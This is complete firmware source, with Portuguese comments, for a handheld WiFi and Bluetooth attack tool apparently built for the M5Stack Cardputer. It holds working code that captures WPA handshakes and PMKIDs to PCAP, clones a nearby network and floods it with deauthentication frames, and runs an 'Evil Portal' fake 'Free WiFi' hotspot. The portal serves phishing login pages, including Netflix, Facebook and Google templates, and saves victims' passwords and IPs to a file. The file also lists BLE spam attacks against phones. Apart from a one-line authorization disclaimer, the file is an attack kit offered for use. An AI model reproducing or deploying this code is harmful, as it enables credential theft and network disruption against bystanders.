/*
 * M5Gotchi PRO - CARDPUTER EDITION
 * WiFi Pentest Suite otimizado para M5Stack Cardputer
 * 
 * OTIMIZAÇÕES CARDPUTER:
 * ✨ Interface compacta para tela 240x135
 * ✨ Controles via teclado QWERTY
 * ✨ Fontes menores e layout otimizado
 * ✨ Atalhos de teclado rápidos
 * 
 * CONTROLES TECLADO:
 * [1] Handshake Capture | [2] Clone & Deauth | [3] Evil Portal
 * [ESC] Voltar ao menu | [ENTER] Selecionar/Confirmar
 * [↑/↓] Navegar listas | [SPACE] Toggle Deauth
 * [T] Trocar modo canal | [R] Reset contadores | [H] Trocar HTML
 * 
 * USO APENAS EM REDES PRÓPRIAS OU COM AUTORIZAÇÃO!
 */

// ==================== DEFINIÇÕES DE PINOS SPI ====================
#ifndef SCK
    #define SCK  36
#endif
#ifndef MISO
    #define MISO 35
#endif
#ifndef MOSI
    #define MOSI 37
#endif
#ifndef SS
    #define SS   34
#endif

#include <M5Unified.h>
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <SD.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi_types.h"
#include "bluetooth_attacks.h"

// ==================== CONFIGURAÇÕES CARDPUTER ====================
#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 135
#define SNAP_LEN 2324
#define CHANNEL_HOP_INTERVAL_MS 3000
#define MAX_PCAP_SIZE 10000000
#define DEAUTH_INTERVAL_MS 5000
#define MAX_NETWORKS 30  // Reduzido para Cardputer

// Evil Portal
#define DNS_PORT 53
#define HTTP_PORT 80
#define PORTAL_SSID "Free WiFi"

// Modos de operação
enum OperationMode {
    MODE_HANDSHAKE_CAPTURE,
    MODE_EVIL_PORTAL,
    MODE_CLONE_DEAUTH,
    MODE_BLUETOOTH,
    MODE_MENU
};

// ==================== VARIÁVEIS GLOBAIS ====================
OperationMode currentMode = MODE_MENU;
int menuSelection = 0;  // Seleção no menu (0=Handshake, 1=Clone, 2=Portal, 3=Bluetooth)
int subMenuSelection = 0;  // Seleção em submenus

// Handshake Capture
const uint8_t PRIORITY_CHANNELS[] = {1, 6, 11};
const uint8_t PRIORITY_CHANNEL_COUNT = 3;
uint8_t currentChannel = 1;
uint8_t channelIndex = 0;
unsigned long lastChannelChange = 0;
unsigned long packetCount = 0;
unsigned long eapolCount = 0;
unsigned long pmkidCount = 0;
bool usePriorityChannelsOnly = true;

// Clone & Deauth
struct NetworkInfo {
    String ssid;
    uint8_t bssid[6];
    int channel;
    int rssi;
    uint8_t encryptionType;
};
NetworkInfo networks[MAX_NETWORKS];
int networkCount = 0;
int selectedNetwork = 0;
bool deauthActive = false;
uint8_t targetBSSID[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int targetChannel = 1;
unsigned long lastDeauth = 0;
unsigned long deauthPacketsSent = 0;

// Evil Portal
WebServer server(HTTP_PORT);
DNSServer dnsServer;
bool portalActive = false;
String portalHTMLPath = "/portal.html";
unsigned long portalVisits = 0;
unsigned long credentialsCaptured = 0;
File logFile;

// PCAP
File pcapFile;
bool sdCardEnabled = false;
int fileCounter = 1;
unsigned long currentFileSize = 0;

// ==================== ESTRUTURAS ====================
typedef struct {
    unsigned frame_ctrl:16;
    unsigned duration_id:16;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    unsigned sequence_ctrl:16;
    uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_ieee80211_packet_t;

typedef struct {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} pcap_hdr_t;

typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} pcaprec_hdr_t;

// ==================== DISPLAY HELPERS CARDPUTER ====================
void drawHeaderCompact(const char* title, uint16_t color = GREEN) {
    M5.Display.fillScreen(BLACK);
    M5.Display.setTextColor(color, BLACK);
    M5.Display.setTextSize(1);
    M5.Display.setCursor(5, 3);
    M5.Display.println(title);
    M5.Display.drawLine(0, 14, SCREEN_WIDTH, 14, color);
}

void drawStatusBar(const char* text, uint16_t color = WHITE) {
    M5.Display.fillRect(0, SCREEN_HEIGHT - 12, SCREEN_WIDTH, 12, BLACK);
    M5.Display.drawLine(0, SCREEN_HEIGHT - 12, SCREEN_WIDTH, SCREEN_HEIGHT - 12, color);
    M5.Display.setTextColor(color, BLACK);
    M5.Display.setTextSize(1);
    M5.Display.setCursor(3, SCREEN_HEIGHT - 10);
    M5.Display.println(text);
}

// ==================== MENU PRINCIPAL CARDPUTER ====================
void displayMenuCompact() {
    drawHeaderCompact("M5GOTCHI PRO - CARDPUTER", CYAN);
    
    M5.Display.setTextSize(1);
    
    int y = 25;
    const char* menuItems[] = {
        "Handshake Capture",
        "Clone + Deauth",
        "Evil Portal",
        "Bluetooth Attacks"
    };
    
    for (int i = 0; i < 4; i++) {
        if (i == menuSelection) {
            M5.Display.fillRect(0, y, SCREEN_WIDTH, 18, DARKGREEN);
            M5.Display.setTextColor(WHITE, DARKGREEN);
            M5.Display.setCursor(5, y + 4);
            M5.Display.print("> ");
        } else {
            M5.Display.setTextColor(WHITE, BLACK);
            M5.Display.setCursor(5, y + 4);
            M5.Display.print("  ");
        }
        
        M5.Display.print(menuItems[i]);
        y += 20;
    }
    
    y += 5;
    M5.Display.setTextColor(YELLOW, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("SD Card: %s", sdCardEnabled ? "OK" : "FAIL");
    
    drawStatusBar("UP/DN: Navigate | ENTER: Select", CYAN);
}

// ==================== HANDSHAKE CAPTURE ====================
void initPcapFile() {
    if (!sdCardEnabled) return;
    
    char filename[32];
    sprintf(filename, "/%d.pcap", fileCounter);
    
    pcapFile = SD.open(filename, FILE_WRITE);
    if (!pcapFile) {
        Serial.println("Erro ao criar arquivo PCAP!");
        return;
    }
    
    pcap_hdr_t pcap_header;
    pcap_header.magic_number = 0xa1b2c3d4;
    pcap_header.version_major = 2;
    pcap_header.version_minor = 4;
    pcap_header.thiszone = 0;
    pcap_header.sigfigs = 0;
    pcap_header.snaplen = SNAP_LEN;
    pcap_header.network = 105;
    
    pcapFile.write((uint8_t*)&pcap_header, sizeof(pcap_hdr_t));
    pcapFile.flush();
    currentFileSize = sizeof(pcap_hdr_t);
    
    Serial.printf("PCAP criado: %s\n", filename);
}

void writePcapPacket(const uint8_t* buf, uint32_t len) {
    if (!sdCardEnabled || !pcapFile) return;
    
    if (currentFileSize >= MAX_PCAP_SIZE) {
        pcapFile.close();
        fileCounter++;
        currentFileSize = 0;
        initPcapFile();
    }
    
    pcaprec_hdr_t packet_header;
    packet_header.ts_sec = millis() / 1000;
    packet_header.ts_usec = (millis() % 1000) * 1000;
    packet_header.incl_len = len;
    packet_header.orig_len = len;
    
    pcapFile.write((uint8_t*)&packet_header, sizeof(pcaprec_hdr_t));
    pcapFile.write(buf, len);
    pcapFile.flush();
    
    currentFileSize += sizeof(pcaprec_hdr_t) + len;
}

bool isEAPOL(const uint8_t* buf, uint32_t len) {
    if (len < 36) return false;
    uint8_t frameType = buf[0];
    if ((frameType & 0x0C) != 0x08) return false;
    
    for (int i = 0; i < len - 1; i++) {
        if (buf[i] == 0x88 && buf[i+1] == 0x8E) {
            return true;
        }
    }
    return false;
}

bool hasPMKID(const uint8_t* buf, uint32_t len) {
    if (!isEAPOL(buf, len)) return false;
    
    for (int i = 0; i < len - 20; i++) {
        if (buf[i] == 0xDD && buf[i+1] >= 0x14) {
            if (buf[i+2] == 0x00 && buf[i+3] == 0x0F && 
                buf[i+4] == 0xAC && buf[i+5] == 0x04) {
                return true;
            }
        }
    }
    return false;
}

void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
    
    uint32_t len = ppkt->rx_ctrl.sig_len;
    packetCount++;
    
    bool isEapolPacket = isEAPOL(ppkt->payload, len);
    if (isEapolPacket) {
        eapolCount++;
        writePcapPacket(ppkt->payload, len);
        
        if (hasPMKID(ppkt->payload, len)) {
            pmkidCount++;
            Serial.println("*** PMKID CAPTURADO! ***");
        }
        
        Serial.printf("EAPOL #%lu capturado!\n", eapolCount);
    }
}

void displayHandshakeCaptureCompact() {
    drawHeaderCompact("HANDSHAKE CAPTURE", GREEN);
    
    M5.Display.setTextSize(1);
    int y = 22;
    
    // Status principal
    M5.Display.setTextColor(WHITE, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("Channel: %02d | %s", 
        currentChannel, 
        usePriorityChannelsOnly ? "PRIORITY" : "ALL");
    
    y += 18;
    M5.Display.setTextColor(CYAN, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("Packets: %lu", packetCount);
    
    y += 14;
    M5.Display.setTextColor(YELLOW, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("EAPOL: %lu", eapolCount);
    
    y += 14;
    M5.Display.setTextColor(MAGENTA, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("PMKID: %lu", pmkidCount);
    
    y += 18;
    M5.Display.setTextColor(GREEN, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("File: %d.pcap (%luKB)", 
        fileCounter, currentFileSize / 1024);
    
    // Menu de ações
    y += 20;
    const char* actions[] = {"Toggle Mode", "Reset Counters", "Back to Menu"};
    for (int i = 0; i < 3; i++) {
        if (i == subMenuSelection) {
            M5.Display.setTextColor(BLACK, WHITE);
            M5.Display.setCursor(5, y);
            M5.Display.printf("> %s", actions[i]);
        } else {
            M5.Display.setTextColor(DARKGREY, BLACK);
            M5.Display.setCursor(5, y);
            M5.Display.printf("  %s", actions[i]);
        }
        y += 10;
    }
    
    drawStatusBar("UP/DN: Select | ENTER: Execute", GREEN);
}

void changeChannel() {
    unsigned long now = millis();
    
    if (now - lastChannelChange >= CHANNEL_HOP_INTERVAL_MS) {
        if (usePriorityChannelsOnly) {
            channelIndex = (channelIndex + 1) % PRIORITY_CHANNEL_COUNT;
            currentChannel = PRIORITY_CHANNELS[channelIndex];
        } else {
            currentChannel = (currentChannel % 13) + 1;
        }
        
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        lastChannelChange = now;
    }
}

// ==================== CLONE & DEAUTH ====================
void scanNetworks() {
    M5.Display.fillScreen(BLACK);
    M5.Display.setCursor(60, 60);
    M5.Display.setTextColor(YELLOW);
    M5.Display.setTextSize(1);
    M5.Display.println("Escaneando WiFi...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks();
    networkCount = min(n, MAX_NETWORKS);
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        uint8_t* bssid = WiFi.BSSID(i);
        memcpy(networks[i].bssid, bssid, 6);
        networks[i].channel = WiFi.channel(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].encryptionType = WiFi.encryptionType(i);
    }
    
    WiFi.scanDelete();
}

void displayNetworkListCompact() {
    drawHeaderCompact("CLONE & DEAUTH", RED);
    
    M5.Display.setTextSize(1);
    int y = 18;
    int visibleNetworks = min(networkCount, 6);  // Menos redes para dar espaço ao menu
    int startIdx = max(0, selectedNetwork - 2);
    
    for (int i = 0; i < visibleNetworks && (startIdx + i) < networkCount; i++) {
        int idx = startIdx + i;
        
        if (idx == selectedNetwork) {
            M5.Display.fillRect(0, y, SCREEN_WIDTH, 12, DARKGREEN);
            M5.Display.setTextColor(WHITE, DARKGREEN);
        } else {
            M5.Display.setTextColor(WHITE, BLACK);
        }
        
        M5.Display.setCursor(2, y + 2);
        
        String ssid = networks[idx].ssid;
        if (ssid.length() > 22) {
            ssid = ssid.substring(0, 19) + "...";
        }
        
        M5.Display.printf("%s", ssid.c_str());
        
        M5.Display.setCursor(SCREEN_WIDTH - 35, y + 2);
        M5.Display.printf("%ddB", networks[idx].rssi);
        
        y += 12;
    }
    
    // Menu de ações
    y += 8;
    const char* actions[] = {"Clone Network", "Toggle Deauth", "Back to Menu"};
    for (int i = 0; i < 3; i++) {
        if (i == subMenuSelection) {
            M5.Display.setTextColor(BLACK, WHITE);
        } else {
            M5.Display.setTextColor(DARKGREY, BLACK);
        }
        M5.Display.setCursor(5, y);
        M5.Display.printf("%c %s", (i == subMenuSelection) ? '>' : ' ', actions[i]);
        y += 10;
    }
    
    // Status Deauth
    if (deauthActive) {
        M5.Display.fillRect(0, SCREEN_HEIGHT - 26, SCREEN_WIDTH, 14, RED);
        M5.Display.setTextColor(WHITE, RED);
        M5.Display.setCursor(5, SCREEN_HEIGHT - 23);
        M5.Display.printf("DEAUTH ACTIVE: %lu pkts", deauthPacketsSent);
    }
    
    drawStatusBar("UP/DN: Select | ENTER: Execute", YELLOW);
}

void sendDeauthPacket(uint8_t *bssid, uint8_t *client) {
    uint8_t deauth_frame[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00,
        0x07, 0x00
    };
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    deauthPacketsSent++;
}

void performDeauthAttack() {
    if (!deauthActive) return;
    
    unsigned long now = millis();
    if (now - lastDeauth >= DEAUTH_INTERVAL_MS) {
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        
        for (int i = 0; i < 5; i++) {
            sendDeauthPacket(targetBSSID, broadcast);
            delay(10);
        }
        
        lastDeauth = now;
        Serial.printf("Deauth enviado para %02X:%02X:%02X:%02X:%02X:%02X\n",
                     targetBSSID[0], targetBSSID[1], targetBSSID[2],
                     targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    }
}

void cloneNetwork() {
    if (networkCount == 0) return;
    
    NetworkInfo &net = networks[selectedNetwork];
    
    memcpy(targetBSSID, net.bssid, 6);
    targetChannel = net.channel;
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(net.ssid.c_str());
    
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    M5.Display.fillScreen(BLACK);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(GREEN);
    M5.Display.setCursor(50, 50);
    M5.Display.println("AP CLONADO!");
    M5.Display.setCursor(20, 65);
    M5.Display.printf("SSID: %s", net.ssid.c_str());
    M5.Display.setCursor(20, 80);
    M5.Display.printf("Canal: %d", targetChannel);
    
    delay(2000);
    
    deauthActive = true;
    deauthPacketsSent = 0;
    
    Serial.println("Clone criado + Deauth ativado!");
}

// ==================== EVIL PORTAL ====================
void handleRoot() {
    portalVisits++;
    
    String html = "";
    
    if (sdCardEnabled && SD.exists(portalHTMLPath.c_str())) {
        File htmlFile = SD.open(portalHTMLPath.c_str(), FILE_READ);
        if (htmlFile) {
            html = htmlFile.readString();
            htmlFile.close();
            Serial.println("Portal HTML carregado do SD!");
        }
    }
    
    if (html.length() == 0) {
        html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
        html += "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}";
        html += ".container{background:white;padding:30px;border-radius:15px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:350px;width:100%}h1{color:#333;margin-bottom:8px;text-align:center;font-size:24px}";
        html += ".subtitle{color:#666;text-align:center;margin-bottom:20px;font-size:13px}input{width:100%;padding:12px;margin:8px 0;border:2px solid #ddd;border-radius:8px;font-size:15px;transition:border 0.3s}";
        html += "input:focus{outline:none;border-color:#667eea}button{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;margin-top:8px;transition:transform 0.2s}";
        html += "button:hover{transform:scale(1.02)}.footer{text-align:center;margin-top:15px;font-size:11px;color:#999}</style></head>";
        html += "<body><div class='container'><h1>🔐 WiFi Login</h1><p class='subtitle'>Entre com suas credenciais</p>";
        html += "<form action='/login' method='POST'><input type='text' name='ssid' placeholder='Nome da Rede' required>";
        html += "<input type='password' name='password' placeholder='Senha' required><button type='submit'>Conectar</button></form>";
        html += "<p class='footer'>Conexão segura • M5Gotchi</p></div></body></html>";
    }
    
    server.send(200, "text/html", html);
}

void handleLogin() {
    credentialsCaptured++;
    
    String ssid = server.arg("ssid");
    String password = server.arg("password");
    
    if (sdCardEnabled) {
        logFile = SD.open("/credentials.txt", FILE_APPEND);
        if (logFile) {
            logFile.printf("=== Captura #%lu ===\n", credentialsCaptured);
            logFile.printf("Time: %lu ms\n", millis());
            logFile.printf("SSID: %s\n", ssid.c_str());
            logFile.printf("Password: %s\n", password.c_str());
            logFile.printf("IP: %s\n", server.client().remoteIP().toString().c_str());
            logFile.println("---");
            logFile.close();
        }
    }
    
    Serial.printf("CREDENCIAL CAPTURADA! SSID: %s | Pass: %s\n", ssid.c_str(), password.c_str());
    
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
    html += "<style>body{font-family:Arial;background:#667eea;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}";
    html += ".box{background:white;padding:30px;border-radius:15px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#4CAF50;margin-bottom:15px;font-size:22px}";
    html += "p{color:#666;font-size:15px}.checkmark{color:#4CAF50;font-size:50px;margin-bottom:15px}</style></head>";
    html += "<body><div class='box'><div class='checkmark'>✓</div><h1>Conectado!</h1><p>Você está conectado.</p><p style='margin-top:15px;font-size:12px;color:#999'>Pode fechar</p></div></body></html>";
    
    server.send(200, "text/html", html);
}

void handleNotFound() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
}

void startEvilPortal() {
    WiFi.disconnect();
    esp_wifi_set_promiscuous(false);
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(PORTAL_SSID);
    
    delay(100);
    
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.onNotFound(handleNotFound);
    server.begin();
    
    portalActive = true;
    portalVisits = 0;
    credentialsCaptured = 0;
    
    Serial.println("Evil Portal iniciado!");
    Serial.printf("AP: %s\n", PORTAL_SSID);
    Serial.printf("IP: %s\n", WiFi.softAPIP().toString().c_str());
}

void displayEvilPortalCompact() {
    drawHeaderCompact("EVIL PORTAL", MAGENTA);
    
    M5.Display.setTextSize(1);
    int y = 22;
    
    M5.Display.setTextColor(CYAN, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("SSID: %s", PORTAL_SSID);
    
    y += 14;
    M5.Display.setCursor(5, y);
    M5.Display.printf("IP: %s", WiFi.softAPIP().toString().c_str());
    
    y += 18;
    M5.Display.setTextColor(WHITE, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("Clients: %d", WiFi.softAPgetStationNum());
    
    y += 14;
    M5.Display.setTextColor(YELLOW, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("Visits: %lu", portalVisits);
    
    y += 14;
    M5.Display.setTextColor(GREEN, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("Captured: %lu", credentialsCaptured);
    
    y += 18;
    M5.Display.setTextColor(MAGENTA, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.printf("Template:");
    M5.Display.setCursor(5, y + 10);
    M5.Display.printf("%s", portalHTMLPath.c_str());
    
    // Menu de ações
    y += 22;
    const char* actions[] = {"Change Template", "Back to Menu"};
    for (int i = 0; i < 2; i++) {
        if (i == subMenuSelection) {
            M5.Display.setTextColor(BLACK, WHITE);
        } else {
            M5.Display.setTextColor(DARKGREY, BLACK);
        }
        M5.Display.setCursor(5, y);
        M5.Display.printf("%c %s", (i == subMenuSelection) ? '>' : ' ', actions[i]);
        y += 10;
    }
    
    drawStatusBar("UP/DN: Select | ENTER: Execute", MAGENTA);
}

// ==================== BLUETOOTH ATTACKS ====================
void displayBluetoothMenu() {
    drawHeaderCompact("BLUETOOTH ATTACKS", MAGENTA);
    
    int y = 22;
    
    M5.Display.setTextColor(CYAN, BLACK);
    M5.Display.setCursor(5, y);
    M5.Display.println("BLE Spam Attacks:");
    
    y += 16;
    M5.Display.setTextColor(WHITE, BLACK);
    
    const char* attacks[] = {
        "Sour Apple (iOS)",
        "Samsung Spam",
        "Google Fast Pair",
        "Microsoft Swiftpair",
        "Stop Attack"
    };
    
    for (int i = 0; i < 5; i++) {
        M5.Display.setCursor(5, y);
        if (i == subMenuSelection) {
            M5.Display.setTextColor(BLACK, WHITE);
            M5.Display.printf("> %s", attacks[i]);
        } else {
            M5.Display.setTextColor(WHITE, BLACK);
            M5.Display.printf("  %s", attacks[i]);
        }
        y += 12;
    }
    
    y += 8;
    M5.Display.setTextColor(YELLOW, BLACK);
    M5.Display.setCursor(5, y);
    
    if (bleAttacks.isRunning()) {
        M5.Display.printf("Status: ACTIVE");
        y += 12;
        M5.Display.setTextColor(GREEN, BLACK);
        M5.Display.setCursor(5, y);
        M5.Display.printf("Packets: %lu", bleAttacks.getPacketsSent());
    } else {
        M5.Display.printf("Status: IDLE");
    }
    
    drawStatusBar("UP/DN: Select | ENTER: Start", MAGENTA);
}

// ==================== KEYBOARD HANDLER CARDPUTER ====================
void handleKeyboard() {
    M5.update();
    
    if (M5Cardputer.Keyboard.isChange()) {
        if (M5Cardputer.Keyboard.isPressed()) {
            Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
            String key = String(status.word.data());
            
            // ====== MENU PRINCIPAL ======
            if (currentMode == MODE_MENU) {
                // Navegar para cima
                if (key == "`") {  // Up arrow
                    menuSelection = (menuSelection - 1 + 4) % 4;
                    displayMenuCompact();
                }
                // Navegar para baixo
                else if (key == ";") {  // Down arrow
                    menuSelection = (menuSelection + 1) % 4;
                    displayMenuCompact();
                }
                // Confirmar seleção
                else if (status.enter) {
                    subMenuSelection = 0;  // Reset submenu
                    
                    switch (menuSelection) {
                        case 0:  // Handshake Capture
                            currentMode = MODE_HANDSHAKE_CAPTURE;
                            drawHeaderCompact("HANDSHAKE CAPTURE");
                            WiFi.mode(WIFI_STA);
                            WiFi.disconnect();
                            delay(100);
                            esp_wifi_set_promiscuous(true);
                            esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
                            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                            if (sdCardEnabled) initPcapFile();
                            Serial.println("Mode: Handshake Capture");
                            break;
                            
                        case 1:  // Clone & Deauth
                            currentMode = MODE_CLONE_DEAUTH;
                            scanNetworks();
                            selectedNetwork = 0;
                            Serial.println("Mode: Clone & Deauth");
                            break;
                            
                        case 2:  // Evil Portal
                            currentMode = MODE_EVIL_PORTAL;
                            startEvilPortal();
                            Serial.println("Mode: Evil Portal");
                            break;
                            
                        case 3:  // Bluetooth Attacks
                            currentMode = MODE_BLUETOOTH;
                            if (bleAttacks.begin()) {
                                displayBluetoothMenu();
                                Serial.println("Mode: Bluetooth Attacks");
                            } else {
                                Serial.println("BLE Init Failed!");
                                currentMode = MODE_MENU;
                                displayMenuCompact();
                            }
                            break;
                    }
                }
            }
            
            // ====== HANDSHAKE CAPTURE ======
            else if (currentMode == MODE_HANDSHAKE_CAPTURE) {
                // Navegar para cima
                if (key == "`") {
                    subMenuSelection = (subMenuSelection - 1 + 3) % 3;
                }
                // Navegar para baixo
                else if (key == ";") {
                    subMenuSelection = (subMenuSelection + 1) % 3;
                }
                // Executar ação
                else if (status.enter) {
                    switch (subMenuSelection) {
                        case 0:  // Toggle Mode
                            usePriorityChannelsOnly = !usePriorityChannelsOnly;
                            break;
                        case 1:  // Reset Counters
                            packetCount = 0;
                            eapolCount = 0;
                            pmkidCount = 0;
                            break;
                        case 2:  // Back to Menu
                            esp_wifi_set_promiscuous(false);
                            if (pcapFile) pcapFile.close();
                            WiFi.mode(WIFI_STA);
                            currentMode = MODE_MENU;
                            menuSelection = 0;
                            displayMenuCompact();
                            break;
                    }
                }
                // ESC = voltar ao menu
                else if (status.del) {
                    esp_wifi_set_promiscuous(false);
                    if (pcapFile) pcapFile.close();
                    WiFi.mode(WIFI_STA);
                    currentMode = MODE_MENU;
                    menuSelection = 0;
                    displayMenuCompact();
                }
            }
            
            // ====== CLONE & DEAUTH ======
            else if (currentMode == MODE_CLONE_DEAUTH) {
                // Navegar para cima
                if (key == "`") {
                    if (subMenuSelection == 0 && selectedNetwork > 0) {
                        // Navegando na lista de redes
                        selectedNetwork--;
                    } else {
                        // Navegando no menu de ações
                        subMenuSelection = (subMenuSelection - 1 + 3) % 3;
                    }
                }
                // Navegar para baixo
                else if (key == ";") {
                    if (subMenuSelection == 0 && selectedNetwork < networkCount - 1) {
                        // Navegando na lista de redes
                        selectedNetwork++;
                    } else {
                        // Navegando no menu de ações
                        subMenuSelection = (subMenuSelection + 1) % 3;
                    }
                }
                // Executar ação
                else if (status.enter) {
                    switch (subMenuSelection) {
                        case 0:  // Clone Network
                            cloneNetwork();
                            break;
                        case 1:  // Toggle Deauth
                            deauthActive = !deauthActive;
                            if (!deauthActive) {
                                WiFi.mode(WIFI_STA);
                            }
                            break;
                        case 2:  // Back to Menu
                            deauthActive = false;
                            WiFi.mode(WIFI_STA);
                            currentMode = MODE_MENU;
                            menuSelection = 0;
                            displayMenuCompact();
                            break;
                    }
                }
                // ESC = voltar ao menu
                else if (status.del) {
                    deauthActive = false;
                    WiFi.mode(WIFI_STA);
                    currentMode = MODE_MENU;
                    menuSelection = 0;
                    displayMenuCompact();
                }
            }
            
            // ====== EVIL PORTAL ======
            else if (currentMode == MODE_EVIL_PORTAL) {
                // Navegar para cima
                if (key == "`") {
                    subMenuSelection = (subMenuSelection - 1 + 2) % 2;
                }
                // Navegar para baixo
                else if (key == ";") {
                    subMenuSelection = (subMenuSelection + 1) % 2;
                }
                // Executar ação
                else if (status.enter) {
                    switch (subMenuSelection) {
                        case 0:  // Change Template
                            if (portalHTMLPath == "/portal.html") {
                                portalHTMLPath = "/portal_netflix.html";
                            } else if (portalHTMLPath == "/portal_netflix.html") {
                                portalHTMLPath = "/portal_facebook.html";
                            } else if (portalHTMLPath == "/portal_facebook.html") {
                                portalHTMLPath = "/portal_google.html";
                            } else {
                                portalHTMLPath = "/portal.html";
                            }
                            Serial.printf("HTML changed: %s\n", portalHTMLPath.c_str());
                            break;
                        case 1:  // Back to Menu
                            portalActive = false;
                            server.stop();
                            dnsServer.stop();
                            WiFi.mode(WIFI_STA);
                            currentMode = MODE_MENU;
                            menuSelection = 0;
                            displayMenuCompact();
                            break;
                    }
                }
                // ESC = voltar ao menu
                else if (status.del) {
                    portalActive = false;
                    server.stop();
                    dnsServer.stop();
                    WiFi.mode(WIFI_STA);
                    currentMode = MODE_MENU;
                    menuSelection = 0;
                    displayMenuCompact();
                }
            }
            
            // ====== BLUETOOTH ATTACKS ======
            else if (currentMode == MODE_BLUETOOTH) {
                // Navegar para cima
                if (key == "`") {
                    subMenuSelection = (subMenuSelection - 1 + 5) % 5;
                    displayBluetoothMenu();
                }
                // Navegar para baixo
                else if (key == ";") {
                    subMenuSelection = (subMenuSelection + 1) % 5;
                    displayBluetoothMenu();
                }
                // Executar ação
                else if (status.enter) {
                    switch (subMenuSelection) {
                        case 0:  // Sour Apple
                            bleAttacks.startSourApple();
                            Serial.println("Starting Sour Apple Attack");
                            break;
                        case 1:  // Samsung Spam
                            bleAttacks.startSamsungSpam();
                            Serial.println("Starting Samsung Spam");
                            break;
                        case 2:  // Google Fast Pair
                            bleAttacks.startGoogleSpam();
                            Serial.println("Starting Google Spam");
                            break;
                        case 3:  // Microsoft Swiftpair
                            bleAttacks.startMicrosoftSpam();
                            Serial.println("Starting Microsoft Spam");
                            break;
                        case 4:  // Stop Attack
                            bleAttacks.stop();
                            Serial.println("Stopped BLE Attack");
                            break;
                    }
                    delay(100);
                    displayBluetoothMenu();
                }
                // ESC = voltar ao menu
                else if (status.del) {
                    bleAttacks.stop();
                    bleAttacks.end();
                    currentMode = MODE_MENU;
                    menuSelection = 0;
                    displayMenuCompact();
                }
            }
        }
    }
}

// ==================== SETUP ====================
void setup() {
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    Serial.begin(115200);
    
    M5.Display.setBrightness(128);
    M5.Display.setRotation(1);  // Landscape para Cardputer
    
    // Inicializar SD Card
    SPI.begin(SCK, MISO, MOSI, SS);
    if (SD.begin(SS, SPI)) {
        sdCardEnabled = true;
        Serial.println("SD Card OK!");
        
        if (SD.exists("/portal.html")) {
            Serial.println("Portal HTML customizado encontrado!");
        }
    } else {
        Serial.println("SD Card falhou!");
        sdCardEnabled = false;
    }
    
    displayMenuCompact();
    
    Serial.println("===================================");
    Serial.println("M5GOTCHI PRO - CARDPUTER EDITION");
    Serial.println("===================================");
    Serial.println("Keyboard Controls:");
    Serial.println("UP/DOWN arrows: Navigate");
    Serial.println("ENTER: Confirm/Select");
    Serial.println("ESC (DEL): Back to menu");
    Serial.println("===================================");
}

